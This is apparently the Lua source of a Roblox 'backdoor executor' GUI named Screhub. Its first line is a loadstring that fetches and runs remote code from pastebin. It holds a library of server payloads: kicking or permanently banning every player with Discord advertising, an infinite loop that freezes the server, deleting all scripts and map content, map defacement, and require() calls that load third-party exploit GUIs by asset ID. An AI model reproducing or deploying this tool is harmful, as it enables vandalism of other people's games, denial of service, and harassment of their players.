-- the loadstring "loadstring(game:HttpGet("https://pastebin.com/raw/dg3cSdZb"))()"
local commands = {
{
	name = "test to see if backdoor",
	code = [[
--it will kick you and schow a text on the top of the screen
local hint = Instance.new("Hint")
hint.Parent = game.Workspace
--settings
hint.Text = "  remote 'E' the anti cheat got active. some one is using exploits."
task.wait(2)
for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
	pcall(function()
		player:Kick("Bannd By overwatch. thinking using exploits")
	end)
end
	]],
},
{
	name = "hick all whit text",
	code = [[
task.wait(1) -- Wait 10 seconds before kicking

local Players = game:GetService("Players")
local exemptUserId = game.CreatorId

for _, player in ipairs(Players:GetPlayers()) do
    if player.UserId ~= exemptUserId then
        player:Kick("GET WRECKED BITCHES!!! https://discord.gg/qttFwPFpfZ")
    end
end
	]],
},
{
	name = "forsaken set timer 0 backdoor",
	code = [[
-- Get the ReplicatedStorage service
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Get the RoundTimer instance
local roundTimer = ReplicatedStorage:WaitForChild("RoundTimer")

-- Set the "TimeLeft" attribute to 0
roundTimer:SetAttribute("TimeLeft", 0)
	]],
},
{
	name = "Glich All Sounds",
	code = [[
--// Glitch All Sounds Script (Volume every 0.5s)

local function glitchSound(sound)
    coroutine.wrap(function()
        local lastVolumeChange = 0
        while sound:IsDescendantOf(game) and sound:IsA("Sound") do
            if sound.Playing then
                -- Pitch and time glitching quickly
                sound.PlaybackSpeed = math.random(50, 150) / 100

                if sound.TimeLength > 0 then
                    pcall(function()
                        sound.TimePosition = math.random(0, math.floor(sound.TimeLength))
                    end)
                end

                -- Volume only every 0.5s
                local now = tick()
                if now - lastVolumeChange >= 0.5 then
                    sound.Volume = math.random(1, 10) / 10
                    lastVolumeChange = now
                end
            end
            wait(0.05)
        end
    end)()
end

-- Apply to existing sounds
for _, obj in ipairs(workspace:GetDescendants()) do
    if obj:IsA("Sound") then
        glitchSound(obj)
    end
end

-- Glitch new sounds added to the workspace
workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("Sound") then
        glitchSound(obj)
    end
end)

	]],
},
{
	name = "Disco",
	code = [[
task.spawn(function()
	local hue = 0
	while true do
		hue = (hue + 5) % 360
		local color = Color3.fromHSV(hue / 360, 1, 1)
		Lighting.Ambient = color
		Lighting.OutdoorAmbient = color
		Lighting.ColorShift_Top = color
		Lighting.ColorShift_Bottom = color
		task.wait(0.1)
	end
end)	
	]],
},
	{
		name = "ad H for this executer",
		code = [[
-- HINT
local hint = Instance.new("Hint")
hint.Parent = game.Workspace
--settings
hint.Text = "Screhub by egalbla (executer creator)/neadamap (the alt for egalbla) better then lalol hub?. inf server control. discord invite: https://discord.gg/PEh6mUtdkw"
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if hint then
        hint:Destroy()
    end
end)
	]],
	},

	{
		name = "fake H loading executer",
		code = [[
-- HINT
local hint = Instance.new("Hint")
hint.Parent = game.Workspace
--settings
hint.Text = "loading Screhub by egalbla. better then lalol hub. inf server control. discord invite: https://discord.gg/PEh6mUtdkw"
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if hint then
        hint:Destroy()
    end
end)
	]],
	},

	{
		name = "ad M for this executer",
		code = [[
-- Message
local message = Instance.new("Message")
message.Parent = game.Workspace
--settings
message.Text = "Screhub by egalbla (executer creator)/neadamap (the alt for egalbla) better then lalol hub?. inf server control. discord invite: https://discord.gg/PEh6mUtdkw"
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if message then
        message:Destroy()
    end
end)
	]],
	},

	{
		name = "ad M and H for this executer",
		code = [[
-- HINT
local hint = Instance.new("Hint")
hint.Parent = game.Workspace
--settings
hint.Text = "Screhub by egalbla (executer creator)/neadamap (the alt for egalbla) better then lalol hub?. inf server control. discord invite: https://discord.gg/PEh6mUtdkw"
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if hint then
        hint:Destroy()
    end
end)

-- Message
local message = Instance.new("Message")
message.Parent = game.Workspace
--settings
message.Text = "Screhub by egalbla (executer creator)/neadamap (the alt for egalbla) better then lalol hub?. inf server control. discord invite: https://discord.gg/PEh6mUtdkw"
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if message then
        message:Destroy()
    end
end)
	]],
	},
	{name = "Spawn Part", code = 'local p = Instance.new("Part", workspace) p.Position = Vector3.new(0,50,0)'},
	{name = "No Server Responds", code = 'while true do Instance.new("Part", workspace) end'},
	{name = "Set Gravity", code = 'workspace.Gravity = 10'},
	{name = "Set Time", code = 'game.Lighting.TimeOfDay = "00:00:00"'},
	{
		name = "C00lkidd",
		code = [[
-- === CONFIG ===
local skyId = "http://www.roblox.com/asset/?id=124933131429825"
local soundId = "rbxassetid://72089843969979"
local decalsid = "http://www.roblox.com/asset/?id=123455609796572"
local Lighting = game:GetService("Lighting")

-- === HELPERS ===
local function createHint(text)
	local hint = Instance.new("Hint")
	hint.Text = text
	hint.Parent = workspace
	task.delay(10, function()
		if hint then hint:Destroy() end
	end)
end

local function createMessage(text)
	local msg = Instance.new("Message")
	msg.Text = text
	msg.Parent = workspace
	task.delay(10, function()
		if msg then msg:Destroy() end
	end)
end

-- === 1. SKYBOX ===
for _, v in ipairs(Lighting:GetChildren()) do
	if v:IsA("Sky") then v:Destroy() end
end
local sky = Instance.new("Sky")
for _, face in ipairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
	sky["Skybox" .. face] = skyId
end
sky.Parent = Lighting

-- 2. 🔊 Play music with EqualizerSoundEffect
local sound = Instance.new("Sound")
sound.Name = "c00lkidd_music"
sound.SoundId = soundId
sound.Volume = 1
sound.PlaybackSpeed = 0.209
sound.Looped = true
sound.Parent = workspace

local eq = Instance.new("EqualizerSoundEffect")
eq.HighGain = -80
eq.LowGain = 0
eq.MidGain = 1
eq.Priority = 1
eq.Parent = sound

sound:Play()

-- === 3. ADD DECALS ===
local function addDecalsTo(part)
	for _, face in ipairs({"Front", "Back", "Left", "Right", "Top", "Bottom"}) do
		local decal = Instance.new("Decal")
		decal.Texture = decalsid
		decal.Face = Enum.NormalId[face]
		decal.Parent = part
	end
end

for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") then
		addDecalsTo(obj)
	end
end

for _, plr in ipairs(game.Players:GetPlayers()) do
	local char = plr.Character
	if char then
		for _, part in ipairs(char:GetDescendants()) do
			if part:IsA("BasePart") then
				addDecalsTo(part)
			end
		end
	end
end

-- 4. 🔄 Rotate the map 56° on the X axis (excluding characters)
for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") and not game.Players:GetPlayerFromCharacter(obj.Parent) then
		obj.CFrame = CFrame.Angles(math.rad(56), 0, 0) * obj.CFrame
	end
end

	]],
	},
	{
		name = "neadamap",
		code = [[

-- === CONFIG ===
local skyId = "rbxassetid://99673469208444"
local soundId = "rbxassetid://16190783444"
local decalsid = "rbxassetid://83691001769229"
local Lighting = game:GetService("Lighting")

-- === HELPERS ===
local function createHint(text)
	local hint = Instance.new("Hint")
	hint.Text = text
	hint.Parent = workspace
	task.delay(10, function()
		if hint then hint:Destroy() end
	end)
end

local function createMessage(text)
	local msg = Instance.new("Message")
	msg.Text = text
	msg.Parent = workspace
	task.delay(10, function()
		if msg then msg:Destroy() end
	end)
end

-- === 1. SKYBOX ===
for _, v in ipairs(Lighting:GetChildren()) do
	if v:IsA("Sky") then v:Destroy() end
end
local sky = Instance.new("Sky")
for _, face in ipairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
	sky["Skybox" .. face] = skyId
end
sky.Parent = Lighting

-- === 2. MUSIC ===
local sound = Instance.new("Sound")
sound.Name = "c00lkidd_music"
sound.SoundId = soundId
sound.Volume = 10
sound.PlaybackSpeed = 1.05
sound.Looped = true
sound.Parent = workspace
sound:Play()

-- === 3. ADD DECALS ===
local function addDecalsTo(part)
	for _, face in ipairs({"Front", "Back", "Left", "Right", "Top", "Bottom"}) do
		local decal = Instance.new("Decal")
		decal.Texture = decalsid
		decal.Face = Enum.NormalId[face]
		decal.Parent = part
	end
end

for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") then
		addDecalsTo(obj)
	end
end

for _, plr in ipairs(game.Players:GetPlayers()) do
	local char = plr.Character
	if char then
		for _, part in ipairs(char:GetDescendants()) do
			if part:IsA("BasePart") then
				addDecalsTo(part)
			end
		end
	end
end

		]],
	},

	{
		name = "Remove all backdoor",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
		obj:Destroy()
	end
end
		]],
	},
	{
		name = "Send Message Remove backdoor",
		code = [[
-- HINT
local hint = Instance.new("Hint")
hint.Parent = game.Workspace
--settings
hint.Text = "Backdoored removed = true"
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if hint then
        hint:Destroy()
    end
end)
		]],
	},

	{
		name = "tuber93",
		code = [[
require(0x6b02f8e17f50)("username")
		]],
	},


	{
		name = "Remove game",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Folder") or obj:IsA("Part") or obj:IsA("Sound") or obj:IsA("Hint") or obj:IsA("Message") then
		obj:Destroy()
	end
end
		]],
	},

	{
		name = "Remove ALL sounds",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Sound") then
		obj:Destroy()
	end
end
		]],
	},
	{
		name = "Remove ALL Gui",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("ScreenGui") or obj:IsA("BillboardGui") then
		obj:Destroy()
	end
end
		]],
	},

	{
		name = "Remove ALL Hints",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Hint") then
		obj:Destroy()
	end
end
		]],
	},

	{
		name = "Remove ALL Message",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Message") then
		obj:Destroy()
	end
end
		]],
	},

	{
		name = "Remove ALL Message and Hints",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Message") or obj:IsA("Message") then
		obj:Destroy()
	end
end
		]],
	},

	{
		name = "Remove Skybox",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Sky") then
		obj:Destroy()
	end
end
		]],
	},

	{
		name = "Remove ALL Decal",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Decal")  then
		obj:Destroy()
	end
end
		]],
	},

	{
		name = "Remove ALL Decal and skybox",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Decal") or obj:IsA("Sky") then
		obj:Destroy()
	end
end
		]],
	},


	{
		name = "Hint",
		code = [[
-- HINT
local hint = Instance.new("Hint")
hint.Parent = game.Workspace
--settings
hint.Text = "Yall can never escape JOIN IT!! https://discord.gg/PEh6mUtdkw"
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if hint then
        hint:Destroy()
    end
end)
	]],
	},



	{
		name = "Message",
		code = [[
-- Message
local message = Instance.new("Message")
message.Parent = game.Workspace
--settings
message.Text = "Team neadamap Join Today"
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if message then
        message:Destroy()
    end
end)
	]],
	},

	{
		name = "Message and Hint",
		code = [[
-- HINT and Message Creator
local hint = Instance.new("Hint")
local message = Instance.new("Message")
hint.Parent = game.Workspace
message.Parent = game.Workspace
--Settings
hint.Text = "Team NeadAMap join today!"
message.Text = "Yall can never escape neadamap! JOIN IT!! https://discord.gg/PEh6mUtdkw"

-- MESSAGE
-- Optional: Auto-remove message after 10 seconds
task.delay(10, function()
    if message then
        message:Destroy()
    end
end)

task.delay(10, function()
    if Hint then
        Hint:Destroy()
    end
end)
	]],
	},

	{
		name = "Message and Hint forever",
		code = [[
-- HINT and Message Creator
local hint = Instance.new("Hint")
local message = Instance.new("Message")
hint.Parent = game.Workspace
message.Parent = game.Workspace
--Settings
hint.Text = "Team NeadAMap join today!"
message.Text = "Yall can never escape JOIN IT!! https://discord.gg/PEh6mUtdkw"
	]],
	},

	{name = "Lupe Spawn Parts", code = [[
spawn(function()
	while true do
		Instance.new("Part", workspace)
		task.wait(0) -- prevent freezing
	end
end)
]]},
	},
	{
		name = "kick all",
		code = [[
for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
	pcall(function()
		player:Kick("Bannd By Screhub by egalbla discord invite for backdoor executer i use:https://discord.gg/PEh6mUtdkw")
	end)
end
		]],
	},
	{
		name = "Kick Whit CONFIGS",
		code = [[
--// CONFIG
local customMessage = "Violation of the rules!"
local targetUsername = "all" -- Use "all" to ban everyone
local nonTargetUsername = "Needamap" -- Player who can't be banned
local banDuration = "forever" -- Number in seconds or "forever"

--// BanSync Core
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local BanStore = DataStoreService:GetDataStore("BanSync")

-- Convert duration
local function getBanExpiry()
	if banDuration == "forever" then
		return "forever"
	else
		local dur = tonumber(banDuration)
		if dur then
			return os.time() + dur
		end
	end
	return nil
end

-- Ban player by name
local function banPlayer(player)
	if player.Name == nonTargetUsername then return end

	local expiry = getBanExpiry()
	local key = "ban_" .. player.UserId
	local success, err = pcall(function()
		BanStore:SetAsync(key, {reason = customMessage, expires = expiry})
	end)

	if success then
		local reason = customMessage
		local msg = player.DisplayName .. " has been banned.\nReason: " .. reason
		player:Kick(msg)
	else
		warn("Failed to ban " .. player.Name .. ": " .. tostring(err))
	end
end

-- Check for existing bans
Players.PlayerAdded:Connect(function(player)
	local success, result = pcall(function()
		return BanStore:GetAsync("ban_" .. player.UserId)
	end)

	if success and result then
		local expires = result.expires
		local reason = result.reason or "Banned."

		if expires == "forever" or (tonumber(expires) and os.time() < tonumber(expires)) then
			player:Kick("You are banned.\nReason: " .. reason)
		else
			-- Expired ban — remove it
			pcall(function()
				BanStore:RemoveAsync("ban_" .. player.UserId)
			end)
		end
	end
end)

-- Execute the ban
for _, player in ipairs(Players:GetPlayers()) do
	if targetUsername == "all" or player.Name:lower() == targetUsername:lower() then
		banPlayer(player)
	end
end

		]],
	},
	{
		name = "Nword Bypass",
		code = [[
local nwordbypass = Instance.new("Sound")
nwordbypass.Name = "nwordbypass"
nwordbypass.Looped = true
nwordbypass.SoundId = "rbxassetid://91252018020920" -- ✅ Ensure this is a valid sound ID
nwordbypass.Volume = 1
nwordbypass.Parent = workspace
nwordbypass:Play()
		]],
	},

	{
		name = "Remove Nword Bypass",
		code = [[
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Sound") then
		obj:Destroy()
	end
end
		]],
	},

{
	name = "balls",
	code = [[
require(93951973913180)("neadamap")
	]],
},
{
	name = "mega slap",
	code = [[
require(133695508006226)("neadamap")
	]],
},
{
	name = "TeamFat gui",
	code = [[
require(13772265165).TeamFatGUICrackedByLua("neadamap")
	]],
},
{
	name = "Sensation",
	code = [[
require(100263845596551)("neadamap")
	]],
},
{
	name = "2006 map",
	code = [[
require(6929171488).loadMap()
	]],
},
{
	name = "Blames Map",
	code = [[
require(6418886263).kfc()
	]],
},
{
	name = "Sword Brickbattle",
	code = [[
require(6675792322).sfoth()
	]],
},
{
	name = "Mcdonalds",
	code = [[
require(3168737443).load()
	]],
},
{
	name = "Dance Devils Mom Roleplay",
	code = [[
require(6599453106).load()
	]],
},
{
	name = "Forest",
	code = [[
require(16991266419)()
	]],
},
{
	name = "Palace",
	code = [[
require(17110631120).asd()
	]],
},
{
	name = "Roblox HQ",
	code = [[
require(17110658137).asd()
	]],
},
{
	name = "KFC",
	code = [[
require(16662863386).kfc()
	]],
},
{
	name = "Indian Scam Center",
	code = [[
require(16662858613).load("neadamap")
	]],
},
{
	name = "Lil Nas X Concert",
	code = [[
require(16662877421).panini()
	]],
},
{
	name = "Waterpark",
	code = [[
require(4781260949)()
	]],
},
{
	name = "Burger King",
	code = [[
require(16668546367).asd()
	]],
},
{
	name = "Walmart",
	code = [[
require(17110655911).asd()
	]],
},
{
	name = "Spongebob",
	code = [[
require(16668637411).asd()
	]],
},
{
	name = "Zombie Apacolaypse",
	code = [[
require(12653566767).load("neadamap")
	]],
},
{
	name = "F00plkidd V5",
	code = [[
require(16006707697). PLSPLS("neadamap") 

	]],
},
{
	name = "c00lgui",
	code = [[
require(118816265113293):ck_nya("neadamap")
	]],
},
{
	name = "knife grab",
	code = [[
require(18665717275).load("neadamap")
	]],
},
{
	name = "topk3k v5",
	code = [[
require(5610305900)("neadamap")
	]],
},
{
	name = "wario die",
	code = [[
require(5213186100)("neadamap")
	]],
},
{
	name = "gun",
	code = [[
require(3023538289).load("neadamap")
	]],
},
{
	name = "k00p's world",
	code = [[
require(9821168174)("neadamap")
	]],
},
{
	name = "Colt python",
	code = [[
require(101908791877273)('neadamap')
	]],
},
{
	name = "you are an idiot",
	code = [[
require(8222129769).youareanidiot("neadamap")
	]],
},
{
	name = "tool pack",
	code = [[
require(4988023471):Rufus14("neadamap") 
	]],
},
{
	name = "Volcano Eruption",
	code = [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function createVolcano(position)
    local volcano = Instance.new("Part")
    volcano.Size = Vector3.new(20, 30, 20)
    volcano.Position = position
    volcano.Anchored = true
    volcano.BrickColor = BrickColor.new("Reddish brown")
    volcano.Name = "Volcano"
    volcano.Parent = workspace

    return volcano
end

local function spawnLavaBall(position)
    local lava = Instance.new("Part")
    lava.Shape = Enum.PartType.Ball
    lava.Material = Enum.Material.Neon
    lava.BrickColor = BrickColor.new("Bright orange")
    lava.Size = Vector3.new(4,4,4)
    lava.Position = position
    lava.Anchored = false
    lava.CanCollide = false
    lava.Parent = workspace

    local bodyVelocity = Instance.new("BodyVelocity", lava)
    bodyVelocity.Velocity = Vector3.new(0, 100, 0) + Vector3.new(math.random(-20,20),0,math.random(-20,20))
    bodyVelocity.MaxForce = Vector3.new(40000,40000,40000)

    -- After 2 seconds, explode
    delay(2, function()
        if lava and lava.Parent then
            -- Explosion effect
            local explosion = Instance.new("Explosion")
            explosion.Position = lava.Position
            explosion.BlastRadius = 10
            explosion.BlastPressure = 50000
            explosion.Parent = workspace

            lava:Destroy()
        end
    end)
end

local function startEruption()
    local randomPos = Vector3.new(math.random(-100,100), 10, math.random(-100,100))
    local volcano = createVolcano(randomPos)

    local eruptionDuration = 30
    local startTime = tick()

    local connection
    connection = RunService.Heartbeat:Connect(function()
        if tick() - startTime > eruptionDuration then
            connection:Disconnect()
            volcano:Destroy()
            return
        end

        if math.random() < 0.05 then -- 5% chance each frame to spawn lava ball
            local lavaPos = volcano.Position + Vector3.new(0, volcano.Size.Y/2, 0)
            spawnLavaBall(lavaPos)
        end
    end)
end

startEruption()

	]],
},
{
	name = "hot potato",
	code = [[
-- Hot Potato Game for Backdoor Legacy

local Players = game:GetService("Players")

local function getPlayers()
	local list = {}
	for _, p in pairs(Players:GetPlayers()) do
		if p.Character and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
			table.insert(list, p)
		end
	end
	return list
end

local potatoHolder = nil
local potatoTime = 10
local active = false

-- Attach potato to player's RightHand to simulate holding
local function attachPotato(player)
	if not player.Character then return end
	local hand = player.Character:FindFirstChild("RightHand") or player.Character:FindFirstChild("Right Arm")
	if not hand then return end

	-- Remove old potato if exists
	local old = player.Character:FindFirstChild("HotPotato")
	if old then old:Destroy() end

	-- Create potato part
	local potato = Instance.new("Part")
	potato.Name = "HotPotato"
	potato.Shape = Enum.PartType.Ball
	potato.BrickColor = BrickColor.new("Bright orange")
	potato.Material = Enum.Material.Neon
	potato.Size = Vector3.new(1,1,1)
	potato.CanCollide = false
	potato.Anchored = false
	potato.Parent = player.Character

	-- Weld potato to hand
	local weld = Instance.new("WeldConstraint")
	weld.Part0 = hand
	weld.Part1 = potato
	weld.Parent = potato

	-- Position potato relative to hand (a bit offset so it looks natural)
	potato.CFrame = hand.CFrame * CFrame.new(0, 0, 0.5)
end

local function explodePlayer(player)
	if not player.Character then return end
	local pos = player.Character:GetPivot().Position
	local explosion = Instance.new("Explosion")
	explosion.Position = pos
	explosion.BlastRadius = 6
	explosion.BlastPressure = 100000
	explosion.DestroyJointRadiusPercent = 1
	explosion.Parent = workspace
end

local function startRound()
	active = true

	local playersList = getPlayers()
	if #playersList == 0 then
		print("No players to play Hot Potato.")
		active = false
		return
	end

	potatoHolder = playersList[math.random(1, #playersList)]
	print("Hot Potato is with "..potatoHolder.Name)

	attachPotato(potatoHolder)

	local timeLeft = potatoTime

	-- BillboardGui timer
	local billboard = Instance.new("BillboardGui")
	billboard.Name = "HotPotatoTimer"
	billboard.Size = UDim2.new(0, 100, 0, 40)
	billboard.StudsOffset = Vector3.new(0, 2, 0)
	billboard.AlwaysOnTop = true
	billboard.Parent = potatoHolder.Character.Head

	local label = Instance.new("TextLabel")
	label.BackgroundTransparency = 1
	label.Size = UDim2.new(1, 0, 1, 0)
	label.TextColor3 = Color3.new(1, 0, 0)
	label.TextScaled = true
	label.Font = Enum.Font.SourceSansBold
	label.Text = "HOT POTATO: "..timeLeft
	label.Parent = billboard

	local heartbeat = game:GetService("RunService").Heartbeat

	local conn
	conn = heartbeat:Connect(function(dt)
		if not potatoHolder or not potatoHolder.Character or not potatoHolder.Character:FindFirstChild("RightHand") then
			conn:Disconnect()
			billboard:Destroy()
			startRound()
			return
		end

		timeLeft = timeLeft - dt
		label.Text = "HOT POTATO: "..math.ceil(timeLeft)

		if timeLeft <= 0 then
			conn:Disconnect()
			billboard:Destroy()

			print(potatoHolder.Name.." exploded!")
			explodePlayer(potatoHolder)

			local old = potatoHolder.Character:FindFirstChild("HotPotato")
			if old then old:Destroy() end

			local alivePlayers = {}
			for _, p in pairs(getPlayers()) do
				if p ~= potatoHolder then
					table.insert(alivePlayers, p)
				end
			end

			if #alivePlayers == 0 then
				print("Game over! No more players.")
				active = false
				return
			end

			potatoHolder = alivePlayers[math.random(1, #alivePlayers)]
			startRound()
		end
	end)

	local potatoPart = potatoHolder.Character:FindFirstChild("HotPotato")
	if potatoPart then
		local touchedConn
		touchedConn = potatoPart.Touched:Connect(function(hit)
			local toucher = Players:GetPlayerFromCharacter(hit.Parent)
			if toucher and toucher ~= potatoHolder and active then
				print(potatoHolder.Name.." passed potato to "..toucher.Name)
				touchedConn:Disconnect()
				conn:Disconnect()
				billboard:Destroy()

				local old = potatoHolder.Character:FindFirstChild("HotPotato")
				if old then old:Destroy() end

				potatoHolder = toucher
				startRound()
			end
		end)
	end
end

startRound()


	]],


}


local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UpdateLogGui"
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 320)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Parent = screenGui
frame.Active = true
frame.Draggable = true
frame.ClipsDescendants = true

-- Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

-- Gradient for frame background
local bgGradient = Instance.new("UIGradient")
bgGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 35)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 18))
}
bgGradient.Rotation = 45
bgGradient.Parent = frame

-- Title label
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -40, 0, 40)
titleLabel.Position = UDim2.new(0, 20, 0, 15)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Update Log V1.4"
titleLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 26
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = frame

-- TextLabel for update log
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, -40, 1, -100)
textLabel.Position = UDim2.new(0, 20, 0, 60)
textLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
textLabel.Text = [[
-This is V1.5.
-Big Update is OUT. It has Maps, Gui's and more.
-New Gui Stile.
-All Commands Work.
-New C0lkidd Script.
-Btw some scripts are require and if you see ("neadamap") replace whit your username.
-game mode made named "hot potato"
-More maps and Gui's coming soon.
]]
textLabel.TextWrapped = true
textLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
textLabel.Font = Enum.Font.Gotham
textLabel.TextSize = 18
textLabel.TextYAlignment = Enum.TextYAlignment.Top
textLabel.Parent = frame

local textLabelCorner = Instance.new("UICorner")
textLabelCorner.CornerRadius = UDim.new(0, 10)
textLabelCorner.Parent = textLabel

-- Close button
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 80, 0, 35)
closeButton.Position = UDim2.new(1, -100, 1, -50)
closeButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 20
closeButton.Text = "Close"
closeButton.Parent = frame

local closeButtonCorner = Instance.new("UICorner")
closeButtonCorner.CornerRadius = UDim.new(0, 8)
closeButtonCorner.Parent = closeButton

-- Hover effect on close button
closeButton.MouseEnter:Connect(function()
    closeButton.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
end)
closeButton.MouseLeave:Connect(function()
    closeButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
end)

closeButton.MouseButton1Click:Connect(function()
    screenGui.Enabled = false
end)


-- Find RemoteEvents by name:
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RemoteEvent = ReplicatedStorage:FindFirstChild("RemoteEvent")
local AcquireEvent = ReplicatedStorage:FindFirstChild("AcquireEvent")

if not RemoteEvent or not AcquireEvent then
	warn("Backdoor Legacy remote events not found! Adjust the names to your game's remotes.")
end

-- GUI creation:
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Screhub"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "Main"
MainFrame.Parent = ScreenGui
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -150)
MainFrame.Size = UDim2.new(0, 600, 0, 300)
MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MainFrame.BorderColor3 = Color3.new(180, 128, 255)
MainFrame.Active = true
MainFrame.Draggable = true

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "Title"
TitleLabel.Parent = MainFrame
TitleLabel.Position = UDim2.new(0, 250, 0, 10)
TitleLabel.Size = UDim2.new(0, 120, 0, 30)
TitleLabel.BackgroundColor3 = Color3.new(0, 0, 0)
TitleLabel.BorderColor3 = Color3.new(0, 0, 0)
TitleLabel.Font = Enum.Font.Legacy
TitleLabel.TextSize = 14
TitleLabel.TextColor3 = Color3.fromRGB(180, 128, 255)
TitleLabel.Text = "Screhub by egalbla v1.5"

local CodeFrame = Instance.new("Frame")
CodeFrame.Name = "CodeFrame"
CodeFrame.Parent = MainFrame
CodeFrame.Position = UDim2.new(0, 200, 0, 50)
CodeFrame.Size = UDim2.new(0, 390, 0, 230)
CodeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
CodeFrame.BorderColor3 = Color3.new(200, 200, 255)

local CodeBox = Instance.new("TextBox")
CodeBox.Name = "CodeBox"
CodeBox.Parent = CodeFrame
CodeBox.Size = UDim2.new(1, -10, 0, 180)
CodeBox.Position = UDim2.new(0, 5, 0, 5)
CodeBox.BackgroundColor3 = Color3.new(0, 0, 0)
CodeBox.BorderColor3 = Color3.new(200, 200, 255)
CodeBox.Font = Enum.Font.Legacy
CodeBox.TextSize = 8
CodeBox.TextColor3 = Color3.new(200, 200, 255)
CodeBox.ClearTextOnFocus = false
CodeBox.MultiLine = true
CodeBox.TextWrapped = true
CodeBox.TextXAlignment = Enum.TextXAlignment.Left
CodeBox.TextYAlignment = Enum.TextYAlignment.Top
CodeBox.Text = "-- Write code or click commands. All Commands Now Work."

local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Name = "ExecuteButton"
ExecuteButton.Parent = CodeFrame
ExecuteButton.Size = UDim2.new(0.48, 0, 0, 40)
ExecuteButton.Position = UDim2.new(0, 5, 0, 190)
ExecuteButton.BackgroundColor3 = Color3.new(0, 0, 0)
ExecuteButton.BorderColor3 = Color3.new(200, 200, 255)
ExecuteButton.Font = Enum.Font.Legacy
ExecuteButton.TextSize = 18
ExecuteButton.TextColor3 = Color3.new(200, 200, 255)
ExecuteButton.Text = "Execute"

local AcquireButton = Instance.new("TextButton")
AcquireButton.Name = "AcquireButton"
AcquireButton.Parent = CodeFrame
AcquireButton.Size = UDim2.new(0.48, 0, 0, 40)
AcquireButton.Position = UDim2.new(0.52, 0, 0, 190)
AcquireButton.BackgroundColor3 = Color3.new(0, 0, 0)
AcquireButton.BorderColor3 = Color3.new(200, 200, 255)
AcquireButton.Font = Enum.Font.Legacy
AcquireButton.TextSize = 18
AcquireButton.TextColor3 = Color3.new(200, 200, 255)
AcquireButton.Text = "Acquire"

local CommandScroll = Instance.new("ScrollingFrame")
CommandScroll.Name = "CommandScroll"
CommandScroll.Parent = MainFrame
CommandScroll.Position = UDim2.new(0, 10, 0, 50)
CommandScroll.Size = UDim2.new(0, 180, 0, 230)
CommandScroll.BackgroundColor3 = Color3.new(0, 0, 0)
CommandScroll.BorderColor3 = Color3.new(200, 200, 255)
CommandScroll.ScrollBarThickness = 8
CommandScroll.Active = true
